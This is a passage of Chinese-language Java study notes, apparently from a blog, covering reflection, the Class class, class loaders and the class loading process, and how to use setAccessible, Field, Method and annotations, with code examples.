<li>反射机制主要应用在对灵活性和扩展性要求很高的系统框架上</li>
</ul>
</li>
<li>反射会<code>模糊</code>程序内部逻辑，<code>可读性较差</code>。</li>
</ul>
<p><strong>总结</strong></p>
<ol>
<li>反射的使用场景：<ul>
<li>我们的业务代码开发过程中，相关的对象和方法的调用都是确定的，因此一般不使用反射</li>
<li>因为反射体现了动态性，因此在设计框架时常常大量使用反射，理解框架需要学习反射机制<br>框架 &#x3D; 反射 + 注解 + 设计模式</li>
</ul>
</li>
<li>通过反射可以创建单例模式中类的多个对象，即使构造器已经私有化</li>
<li>反射和封装性<ul>
<li>封装性主要体现的是是否建议为欧盟调用内部的api的问题</li>
<li>反射体现的是我们能否调用的问题，因为在运行时类的完整结构都被加载在内存中，所以我们可以调用</li>
</ul>
</li>
</ol>
<h4 id="反射的源头-Class类"><a href="#反射的源头-Class类" class="headerlink" title="反射的源头-Class类"></a>反射的源头-Class类</h4><p><strong>Class类的理解</strong><br>针对编写好的.java源文件进行编译(使用javac.exe)会生成一个或多个.class字节码文件，然后使用<code>java.exe</code>命令对指定的.class文件进行解释运行。在解释运行的过程中，需要使用类的加载器将.class字节码文件加载到内存中的方法区，加载到内存中的.class文件对应的结构即为Class类的一个实例。某个类的属性、方法和构造器、某个类到底实现了哪些接口。对于每个类而言，JRE 都为其保留一个不变的 Class 类型的对象。一个 Class 对象包含了特定某个结构(class&#x2F;interface&#x2F;enum&#x2F;annotation&#x2F;primitive type&#x2F;void&#x2F;[])的有关信息。 运行时类在内存中会缓存起来，在整个执行期间都只加载一次（不严谨）</p>
<ul>
<li>Class本身也是一个类</li>
<li><strong>Class 对象只能由系统建立对象</strong></li>
<li><strong>一个加载的类在 JVM 中只会有一个Class实例</strong> </li>
<li>一个Class对象对应的是一个加载到JVM中的一个.class文件</li>
<li>每个类的实例都会记得自己是由哪个 Class 实例所生成</li>
<li>通过Class可以完整地得到一个类中的所有被加载的结构 </li>
<li>Class类是Reflection的根源，针对任何你想动态加载、运行的类，唯有先获得相应的Class对象</li>
</ul>
<p>说明：下图中字符串常量池在JDK6中存储在方法区；JDK7及以后，存储在堆空间。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240722151909.png" alt="内存结构示意图"><br>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> Person.class<span class="comment">//运行时类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class2</span> <span class="operator">=</span> String.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Class</span> class3 = Comparable.class</span><br></pre></td></tr></table></figure>


<p><strong>获取Class类的实例</strong></p>
<ol>
<li>要求编译期间已知类型<br>若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高<br><code>Class clazz = String.class;</code></li>
<li>获取对象的运行时类型<br>已知某个类的实例，调用该实例(对象)的getClass()方法获取Class对象，以下示例中person是Person类的一个对象<br><code>Class clazz = person.getClass();</code></li>
<li>可以获取编译期间未知的类型<br>已知一个类的全类名，且该类在类路径下，可通过Class类的静态方法forName()获取，可能抛出ClassNotFoundException<br><code>Class clazz = Class.forName(&quot;java.lang.String&quot;);</code></li>
<li>其他方式(不做要求)，使用场景和3一样，不需要掌握<br>可以用系统类加载对象或自定义加载器对象加载指定路径下的类型<br><code>ClassLoader cl = this.getClass().getClassLoader();</code><br><code>Class clazz4 = cl.loadClass(&quot;类的全类名&quot;);</code></li>
</ol>
<p><strong>Class的实例可以指向哪些结构</strong>（所有java类型）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Object.class; <span class="comment">//1 class:外部类，成员（成员内部类，静态内部类），局部内部类，匿名内部类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Comparable.class; <span class="comment">//2 interface：接口</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> String[].class;  <span class="comment">//3 []:数组</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> <span class="type">int</span>[][].class;</span><br><span class="line"><span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> ElementType.class; <span class="comment">//4 enum:枚举</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c6</span> <span class="operator">=</span> Override.class; <span class="comment">//5 annotation:注解@interface</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c7</span> <span class="operator">=</span> <span class="type">int</span>.class;  <span class="comment">//6 primitive type：基本数据类型</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c8</span> <span class="operator">=</span> <span class="keyword">void</span>.class; <span class="comment">//7 void</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c9</span> <span class="operator">=</span> Class.class;</span><br><span class="line"><span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span>[] b = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">100</span>];</span><br><span class="line"><span class="type">Class</span> <span class="variable">c10</span> <span class="operator">=</span> a.getClass();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c11</span> <span class="operator">=</span> b.getClass();</span><br><span class="line"><span class="comment">// 只要元素类型与维度一样，就是同一个Class</span></span><br><span class="line">System.out.println(c10 == c11);</span><br></pre></td></tr></table></figure>


<p><strong>常用方法</strong></p>
<table>
<thead>
<tr>
<th><strong>方法名</strong></th>
<th><strong>功能说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>static  Class forName(String  name)</td>
<td>返回指定类名  name  的  Class  对象</td>
</tr>
<tr>
<td>Object  newInstance()</td>
<td>调用缺省构造函数，返回该Class对象的一个实例</td>
</tr>
<tr>
<td>getName()</td>
<td>返回此Class对象所表示的实体（类、接口、数组类、基本类型或void）名称</td>
</tr>
<tr>
<td>Class  getSuperClass()</td>
<td>返回当前Class对象的父类的Class对象</td>
</tr>
<tr>
<td>Class  [] getInterfaces()</td>
<td>获取当前Class对象的接口</td>
</tr>
<tr>
<td>ClassLoader  getClassLoader()</td>
<td>返回该类的类加载器</td>
</tr>
<tr>
<td>Class  getSuperclass()</td>
<td>返回表示此Class所表示的实体的超类的Class</td>
</tr>
<tr>
<td>Constructor[]  getConstructors()</td>
<td>返回一个包含某些Constructor对象的数组</td>
</tr>
<tr>
<td>Field[]  getDeclaredFields()</td>
<td>返回Field对象的一个数组</td>
</tr>
<tr>
<td>Method  getMethod(String  name,Class … paramTypes)</td>
<td>返回一个Method对象，此对象的形参类型为paramType</td>
</tr>
</tbody></table>
<h4 id="类的加载器和加载过程"><a href="#类的加载器和加载过程" class="headerlink" title="类的加载器和加载过程"></a>类的加载器和加载过程</h4><p><strong>类的加载过程</strong></p>
<p>类在内存中完整的生命周期：加载–&gt;使用–&gt;卸载。其中加载过程又分为：装载、链接、初始化三个阶段。当程序主动使用某个类时，如果该类还未被加载到内存中，系统会通过加载、链接、初始化三个步骤来对该类进行初始化。如果没有意外，JVM将会连续完成这三个步骤，所以有时也把这三个步骤统称为类加载。<br>类的加载又分为三个阶段：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240722160449.png" alt="类的加载"></p>
<ol>
<li>装载（Loading）<br>将类的class文件读入内存，并为之创建一个java.lang.Class对象。此过程由类加载器完成</li>
<li>链接（Linking）<br>①验证Verify：确保加载的类信息符合JVM规范，例如：以cafebabe开头，没有安全方面的问题。<br>②准备Prepare：正式为类变量（static）分配内存并<code>设置类变量默认初始值</code>的阶段，这些内存都将在方法区中进行分配。<br>③解析Resolve：虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程。</li>
<li>初始化（Initialization）<ul>
<li>执行<code>类构造器&lt;clinit&gt;()方法</code>的过程。<code>类构造器&lt;clinit&gt;()方法</code>是由编译期自动收集类中所有类变量的赋值动作和静态代码块中的语句合并产生的。（类构造器是构造类信息的，不是构造该类对象的构造器）。</li>
<li>当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。</li>
<li>虚拟机会保证一个<code>类的&lt;clinit&gt;()方法</code>在多线程环境中被正确加锁和同步。</li>
</ul>
</li>
</ol>
<p><strong>类的加载器</strong></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240722160706.png" alt="类的加载器"></p>
<p><strong>作用</strong><br>将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口。<br>类缓存：标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到类加载器中，它将维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象。</p>
<p><strong>分类</strong></p>
<p>JVM（以jdk8为例）支持两种类型的类加载器，分别为<code>(启动)引导类加载器（Bootstrap ClassLoader）</code>和<code>自定义类加载器（User-Defined ClassLoader）</code>。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240722161041.png" alt="类加载器"></p>
<p>从概念上来讲，自定义类加载器一般指的是程序中由开发人员自定义的一类类加载器，但是Java虚拟机规范却没有这么定义，而是将所有派生于抽象类ClassLoader的类加载器都划分为自定义类加载器。无论类加载器的类型如何划分，在程序中我们最常见的类加载器结构主要是如下情况：</p>
<ol>
<li><strong>启动类加载器（引导类加载器，Bootstrap ClassLoader）</strong><ul>
<li>这个类加载使用<code>C/C++语言</code>实现的，嵌套在JVM内部。获取它的对象时往往返回null</li>
<li>它用来加载Java的核心库（JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;rt.jar或sun.boot.class.path路径下的内容）。用于提供JVM自身需要的类。</li>
<li>并不继承自java.lang.ClassLoader，没有父加载器。</li>
<li>出于安全考虑，Bootstrap启动类加载器只加载包名为java、javax、sun等开头的类</li>
<li>加载扩展类和应用程序类加载器，并指定为他们的父类加载器。</li>
</ul>
</li>
<li><strong>扩展类加载器（Extension ClassLoader）</strong><ul>
<li>Java语言编写，由sun.misc.Launcher$ExtClassLoader实现。</li>
<li>继承于ClassLoader类</li>
<li>父类加载器为启动类加载器</li>
<li>从java.ext.dirs系统属性所指定的目录中加载类库，或从JDK的安装目录的jre&#x2F;lib&#x2F;ext子目录下加载类库。如果用户创建的JAR放在此目录下，也会自动由扩展类加载器加载。</li>
</ul>
</li>
<li><strong>应用程序类加载器（系统类加载器，AppClassLoader）</strong><ul>
<li>java语言编写，由sun.misc.Launcher$AppClassLoader实现</li>
<li>继承于ClassLoader类</li>
<li>父类加载器为扩展类加载器</li>
<li>它负责加载环境变量classpath或系统属性 java.class.path 指定路径下的类库 </li>
<li>应用程序中的类加载器默认是系统类加载器。</li>
<li>它是用户自定义类加载器的默认父加载器</li>
<li>通过ClassLoader的getSystemClassLoader()方法可以获取到该类加载器</li>
</ul>
</li>
<li><strong>用户自定义类加载器（了解）</strong><ul>
<li>在Java的日常应用程序开发中，类的加载几乎是由上述3种类加载器相互配合执行的。在必要时，我们还可以自定义类加载器，来定制类的加载方式。</li>
<li>体现Java语言强大生命力和巨大魅力的关键因素之一便是，Java开发者可以自定义类加载器来实现类库的动态加载，加载源可以是本地的JAR包，也可以是网络上的远程资源。</li>
<li>同时，自定义加载器能够实现<code>应用隔离</code>，例如 Tomcat，Spring等中间件和组件框架都在内部实现了自定义的加载器，并通过自定义加载器隔离不同的组件模块。这种机制比C&#x2F;C++程序要好太多，想不修改C&#x2F;C++程序就能为其新增功能，几乎是不可能的，仅仅一个兼容性便能阻挡住所有美好的设想。</li>
<li>自定义类加载器通常需要继承于ClassLoader。</li>
</ul>
</li>
</ol>
<p><strong>查看某个类的类加载器对象</strong></p>
<p>（1）获取默认的系统类加载器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">classloader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure>

<p>（2）查看某个类是哪个类加载器加载的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">classloader</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;exer2.ClassloaderDemo&quot;</span>).getClassLoader();</span><br><span class="line"><span class="comment">//如果是根加载器加载的类，则会得到null</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classloader1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getClassLoader();</span><br></pre></td></tr></table></figure>

<p>（3）获取某个类加载器的父加载器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">parentClassloader</span> <span class="operator">=</span> classloader.getParent();</span><br></pre></td></tr></table></figure>


<p><strong>(重要)使用ClassLoader获取流</strong></p>
<p>关于类加载器的一个主要方法：getResourceAsStream(String str):获取类路径下的指定文件的输入流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">in = <span class="built_in">this</span>.getClass().getClassLoader().getResourceAsStream(<span class="string">&quot;exer2\\test.properties&quot;</span>);</span><br><span class="line">System.out.println(in);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要掌握如下的代码</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test5</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pros</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="comment">//方式1：此时默认的相对路径是当前的module</span></span><br><span class="line"><span class="comment">//        FileInputStream is = new FileInputStream(&quot;info.properties&quot;);</span></span><br><span class="line"><span class="comment">//        FileInputStream is = new FileInputStream(&quot;src//info1.properties&quot;);</span></span><br><span class="line">        <span class="comment">//方式2：使用类的加载器</span></span><br><span class="line">        <span class="comment">//此时默认的相对路径是当前module的src目录</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().getResourceAsStream(<span class="string">&quot;info1.properties&quot;</span>);</span><br><span class="line">        pros.load(is);</span><br><span class="line">        <span class="comment">//获取配置文件中的信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pros.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> pros.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;name = &quot;</span> + name + <span class="string">&quot;, password = &quot;</span> + password);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<h4 id="反射的应用"><a href="#反射的应用" class="headerlink" title="反射的应用"></a>反射的应用</h4><h5 id="应用1：创建运行时类的对象"><a href="#应用1：创建运行时类的对象" class="headerlink" title="应用1：创建运行时类的对象"></a>应用1：创建运行时类的对象</h5><p>这是反射机制应用最多的地方。创建运行时类的对象有两种方式：<br><strong>方式1：直接调用Class对象的newInstance()方法</strong><br>步骤：<br>1）获取该类型的Class对象  2）调用Class对象的newInstance()方法创建对象<br>要求： 1）类<em>必须有一个无参数的构造器</em>(javaBean必须有无参构造器原因之一)。2）类的构造器的访问权限需要足够。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> Person.class;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Person类的实例</span></span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) class1.newInstance();<span class="comment">// 过时方法</span></span><br><span class="line">    System.out.println(person);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方式2：通过获取构造器对象来进行实例化</strong></p>
<p>步骤：<br>1）通过Class类的getDeclaredConstructor(Class … parameterTypes)取得本类的指定形参类型的构造器<br>2）向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。<br>3）通过Constructor实例化对象。</p>
<blockquote>
<p>如果构造器的权限修饰符修饰的范围不可见，也可以调用setAccessible(true)</p>
</blockquote>
<h5 id="了解-应用2：获取运行时类的完整结构"><a href="#了解-应用2：获取运行时类的完整结构" class="headerlink" title="(了解)应用2：获取运行时类的完整结构"></a>(了解)应用2：获取运行时类的完整结构</h5><p>可以获取：包、修饰符、类型名、父类（包括泛型父类）、父接口（包括泛型父接口）、成员（属性、构造器、方法）、注解（类上的、方法上的、属性上的）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.实现的全部接口</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt;[] getInterfaces()   </span><br><span class="line"><span class="comment">//确定此对象所表示的类或接口实现的接口。 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.所继承的父类</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;? Super T&gt; getSuperclass()</span><br><span class="line"><span class="comment">//返回表示此 Class 所表示的实体（类、接口、基本类型）的父类的 Class。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.全部的构造器</span></span><br><span class="line"><span class="keyword">public</span> Constructor&lt;T&gt;[] getConstructors()</span><br><span class="line"><span class="comment">//返回此 Class 对象所表示的类的所有public构造方法。</span></span><br><span class="line"><span class="keyword">public</span> Constructor&lt;T&gt;[] getDeclaredConstructors()</span><br><span class="line"><span class="comment">//返回此 Class 对象表示的类声明的所有构造方法。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Constructor类中：</span></span><br><span class="line"><span class="comment">//取得修饰符: </span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getModifiers</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">//取得方法名称: </span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">//取得参数的类型：</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt;[] getParameterTypes();</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.全部的方法</span></span><br><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods()</span><br><span class="line"><span class="comment">//返回此Class对象所表示的类或接口的全部方法</span></span><br><span class="line"><span class="keyword">public</span> Method[] getMethods()  </span><br><span class="line"><span class="comment">//返回此Class对象所表示的类或接口的public的方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Method类中：</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; getReturnType()</span><br><span class="line"><span class="comment">//取得全部的返回值</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt;[] getParameterTypes()</span><br><span class="line"><span class="comment">//取得全部的参数</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getModifiers</span><span class="params">()</span></span><br><span class="line"><span class="comment">//取得修饰符</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt;[] getExceptionTypes()</span><br><span class="line"><span class="comment">//取得异常信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.全部的Field</span></span><br><span class="line"><span class="keyword">public</span> Field[] getFields() </span><br><span class="line"><span class="comment">//返回此Class对象所表示的类或接口的public的Field。</span></span><br><span class="line"><span class="keyword">public</span> Field[] getDeclaredFields() </span><br><span class="line"><span class="comment">//返回此Class对象所表示的类或接口的全部Field。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Field方法中：</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getModifiers</span><span class="params">()</span></span><br><span class="line"><span class="comment">//以整数形式返回此Field的修饰符</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; getType()  </span><br><span class="line"><span class="comment">//得到Field的属性类型</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>  </span><br><span class="line"><span class="comment">//返回Field的名称。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//6. Annotation相关</span></span><br><span class="line">get <span class="title function_">Annotation</span><span class="params">(Class&lt;T&gt; annotationClass)</span> </span><br><span class="line">getDeclaredAnnotations() </span><br><span class="line"></span><br><span class="line"><span class="comment">//7.泛型相关</span></span><br><span class="line"><span class="comment">//获取父类泛型类型：</span></span><br><span class="line">Type <span class="title function_">getGenericSuperclass</span><span class="params">()</span></span><br><span class="line"><span class="comment">//泛型类型：ParameterizedType</span></span><br><span class="line"><span class="comment">//获取实际的泛型类型参数数组：</span></span><br><span class="line">getActualTypeArguments()</span><br><span class="line"></span><br><span class="line"><span class="comment">//8.类所在的包</span></span><br><span class="line">Package <span class="title function_">getPackage</span><span class="params">()</span> </span><br></pre></td></tr></table></figure>


<h5 id="掌握-应用3：调用运行时类的指定结构"><a href="#掌握-应用3：调用运行时类的指定结构" class="headerlink" title="(掌握)应用3：调用运行时类的指定结构"></a>(掌握)应用3：调用运行时类的指定结构</h5><p><strong>调用指定的属性</strong></p>
<p>在反射机制中，可以直接通过Field类操作类中的属性，通过Field类提供的set()和get()方法就可以完成设置和取得属性内容的操作。<br>（1）获取该类型的Class对象<br><code>Class clazz = Class.forName(&quot;包.类名&quot;);</code><br>（2）获取属性对象<br><code>Field field = clazz.getDeclaredField(&quot;属性名&quot;);</code><br>（3）如果属性的权限修饰符不是public，那么需要设置属性可访问<br><code>field.setAccessible(true);</code><br>（4）创建实例对象：如果操作的是非静态属性，需要创建实例对象<br><code>Object obj = clazz.newInstance();</code> &#x2F;&#x2F;有公共的无参构造<br><code>Object obj = 构造器对象.newInstance(实参...);</code>&#x2F;&#x2F;通过特定构造器对象创建实例对象<br>（5）设置指定对象obj上此Field的属性内容<br><code>field.set(obj,&quot;属性值&quot;);</code>&#x2F;&#x2F; 如果操作静态变量，那么实例对象可以省略，用null表示<br>（6）取得指定对象obj上此Field的属性内容<br><code>Object value = field.get(obj);</code> &#x2F;&#x2F;如果操作静态变量，那么实例对象可以省略，用null表示</p>
<p><strong>关于setAccessible方法的使用：</strong></p>
<ul>
<li>Method和Field、Constructor对象都有setAccessible()方法。</li>
<li>setAccessible启动和禁用访问安全检查的开关。</li>
<li>参数值为true则指示反射的对象在使用时应该取消Java语言访问检查。<ul>
<li>提高反射的效率。如果代码中必须用反射，而该句代码需要频繁的被调用，那么请设置为true。</li>
<li>使得原本无法访问的私有成员也可以访问</li>
</ul>
</li>
<li>参数值为false则指示反射的对象应该实施Java语言访问检查。</li>
</ul>
<p><strong>步骤</strong></p>
<ol>
<li>通过Class实例调用<code>.getDeclaredField(&quot;属性名&quot;);</code>,获取运行时类指定名的属性</li>
<li>setAccessible(true):确保此属性是可以访问的</li>
<li>通过Field类的实例调用get(Object obj)(获取的操作)或set(Object obj,Object value)（设置的操作）进行操作</li>
</ol>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> Person.class;</span><br><span class="line"><span class="type">Person</span> <span class="variable">per</span> <span class="operator">=</span> (Person) class1.newInstance();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> class1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(per,<span class="string">&quot;Tom&quot;</span>);</span><br><span class="line"><span class="comment">// 在类变量中设置静态属性(类变量)可以set(null,&quot;value&quot;)</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class2</span> <span class="operator">=</span> Peron.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> class1.getDeclaredField(<span class="string">&quot;info&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(<span class="literal">null</span>,<span class="string">&quot;value&quot;</span>);</span><br></pre></td></tr></table></figure>


<p><br><br></p>
<p><strong>调用指定的方法和构造器</strong></p>
<p>（1）获取该类型的Class对象<br><code>Class clazz = Class.forName(&quot;包.类名&quot;);</code><br>（2）获取方法对象<br><code>Method method = clazz.getDeclaredMethod(&quot;方法名&quot;,方法的形参类型列表);</code><br>（3）创建实例对象<br><code>Object obj = clazz.newInstance();</code><br>（4）调用方法<br><code>Object result = method.invoke(obj, 方法的实参值列表);</code></p>
<blockquote>
<p>如果方法的权限修饰符修饰的范围不可见，也可以调用setAccessible(true)<br>如果方法是静态方法，实例对象也可以省略，用null代替<br>（5）获取构造器对象<br><code>Constructor constructor= clazz.getDeclaredConstructor(形参类型列表);</code></p>
</blockquote>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span> <span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> Person.class;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">per</span> <span class="operator">=</span> (Person) class1.newInstance();</span><br><span class="line">    <span class="comment">// 使用此方法必须是Person类有空参构造器，否则使用以下等价方法</span></span><br><span class="line">    <span class="comment">// Constructor constructor = class1.getDeclaredConstructor(Class args...);</span></span><br><span class="line">    <span class="comment">// constructor.setAccessible(true);</span></span><br><span class="line">    <span class="comment">// Person per = (Person) constructor.newInstance(&quot;Tom&quot;,12);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1 通过Class实例调用getDeclareMethod(methodName,Class args...)，获取指定方法</span></span><br><span class="line">    <span class="comment">// Class args指的是形参数据类型对应的Class实例</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">showNationMethod</span> <span class="operator">=</span> class1.getDeclaredMethod(<span class="string">&quot;showNation&quot;</span>, String.class, <span class="type">int</span>.class);</span><br><span class="line">    <span class="comment">// 2 setAccessible(true),确保此方法可以访问</span></span><br><span class="line">    showNationMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//3 通过Method实例调用invoke(Object obj,Object ..objs),即对Method对应方法的调用，其返回值即为</span></span><br><span class="line">    <span class="comment">// 对应方法的返回值，若对应方法返回值为void，则invoke()返回值为null</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> showNationMethod.invoke(per,<span class="string">&quot;CHN&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    System.out.println(returnValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h5 id="了解-应用4-读取注解信息"><a href="#了解-应用4-读取注解信息" class="headerlink" title="(了解)应用4 读取注解信息"></a>(了解)应用4 读取注解信息</h5><p><strong>注解的语法参考SuppressWarnings</strong><br>一个完整的注解应该包含三个部分：<br>（1）声明<br>（2）使用<br>（3）读取<br>声明和使用的语法参见Java-note-2 &#x3D;&gt; 常用类</p>
<p><strong>读取和处理自定义注解</strong></p>
<p>自定义注解必须配上注解的信息处理流程才有意义。<br>我们自己定义的注解，只能使用反射的代码读取。所以自定义注解的声明周期必须是RetentionPolicy.RUNTIME。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;FIELD&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Column &#123;</span><br><span class="line">    String <span class="title function_">columnName</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">columnType</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Target(&#123;TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Table &#123;</span><br><span class="line">    String <span class="title function_">tableName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Table(tableName = &quot;Customer&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">    <span class="meta">@Column(columnName = &quot;cust_name&quot;,columnType = &quot;varchar&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Column(columnName = &quot;cust_Age&quot;,columnType = &quot;int&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span> <span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> Customer.class;</span><br><span class="line">        <span class="comment">// 获取类声明的注解</span></span><br><span class="line">        <span class="type">Table</span> <span class="variable">annotation</span> <span class="operator">=</span> (Table) class1.getDeclaredAnnotation(Table.class);</span><br><span class="line">        System.out.println(annotation.tableName());</span><br><span class="line">        <span class="comment">// 获取属性声明的注解</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> class1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Column</span> <span class="variable">column</span> <span class="operator">=</span> nameField.getDeclaredAnnotation(Column.class);</span><br><span class="line">        System.out.println(column.columnName());</span><br><span class="line">        